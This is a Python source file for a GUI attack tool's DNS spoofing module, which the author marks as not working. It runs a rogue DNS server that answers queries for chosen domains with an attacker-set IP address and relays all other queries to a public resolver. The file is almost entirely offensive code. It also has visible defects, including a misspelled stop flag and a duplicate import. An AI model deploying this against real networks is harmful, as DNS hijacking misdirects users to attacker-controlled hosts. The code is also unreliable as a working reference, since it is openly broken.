# NOT WORKING

import socket
from dnslib import DNSRecord, DNSHeader, RR, dns
import threading
import threading
import traceback

from tkinter import *

def startDnsSpoofing(terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
    global redirect_to, dnsSpoofingIsRunning, dnsSpoofingThreads, terminalLabel, wiresharkLabel, errorOutputLabel

    dnsSpoofingIsRunning = False
    dnsSpoofingThreads = threading.Thread(target = lambda : dnsHijackHub(TGT_IP, TGT_DOMAINS))

    TGT_IP = "8.8.8.8"  # The IP address you want the target domain(s) to resolve to
    TGT_DOMAINS = ["testphp.vulnweb.com"]  # The target domain(s), here I am using an example.

    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    terminalLabel.configure(bg = colorConfig) 
    wiresharkLabel.configure(bg = colorConfig)
    errorOutputLabel.configure(bg = colorConfig)

    terminalLabel["text"] += "$ Running DNS Spoofing Attack...\n\n"

    runDnsSpoofing()

    terminalLabel.pack(anchor = NW)
    errorOutputLabel.pack(anchor = NW)

def stopDnsSpoofing() :
    global dnsSpoofingThreads, dnsSpoofingIsRunning

    try:
        terminalLabel["text"] += "\n$ Stopping DNS Spoofing Attack...\n\n"
        dnsSpoofingIsrunning = False
        dnsSpoofingThreads.join(0)
        dnsSpoofingThreads = None

        #subprocess.Popen.send_signal(signal.SIGINT)
        #subprocess.call(["iptables", "--flush"])

        terminalLabel["text"] += "$ DNS Spoofing Attack successfully stopped!\n"
    except (AttributeError, RuntimeError):
        errorOutputLabel["text"] += traceback.format_exc()
    except Exception as e:
        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"

def runDnsSpoofing() :
    global dnsSpoofingThreads, dnsSpoofingIsRunning
    dnsSpoofingIsRunning = True
    dnsSpoofingThreads.start()

def dnsHijackHub(tgt_ip, tgt_domains):
    DNS_PORT = 53
    host = 'localhost'  # Ensure all traffic is routed to localhost for DNS resolution

    threading.Thread(target=serve, args=(host, DNS_PORT, tgt_ip, tgt_domains)).start()

def parse_dns(packet):
    return DNSRecord.parse(packet)

def create_response(data, tgt_ip):
    request = parse_dns(data)

    print(f'Received request for {request.q.qname}')

    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

    reply.add_answer(RR(request.q.qname, dns.A, rdata=dns.A(tgt_ip), ttl=60))

    return reply.pack()

def serve(host, port, tgt_ip, tgt_domains):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind((host, port))

    print(f"Server listening on {host}:{port}")

    while True:
        data, addr = server_socket.recvfrom(512)

        dns_req = parse_dns(data)
        domain = str(dns_req.q.qname)

        if any(tgt_domain in domain for tgt_domain in tgt_domains):
            print(f"Intercepted request for: {domain}")

            server_socket.sendto(create_response(data, tgt_ip), addr)
        else:
            print(f"Normal request for: {domain}")
            legitimate_dns_server = ('8.8.8.8', 53)
            server_socket.sendto(data, legitimate_dns_server)    # Forward request
            response_data, _ = server_socket.recvfrom(512)       # Receive response
            server_socket.sendto(response_data, addr)            # Relay back response
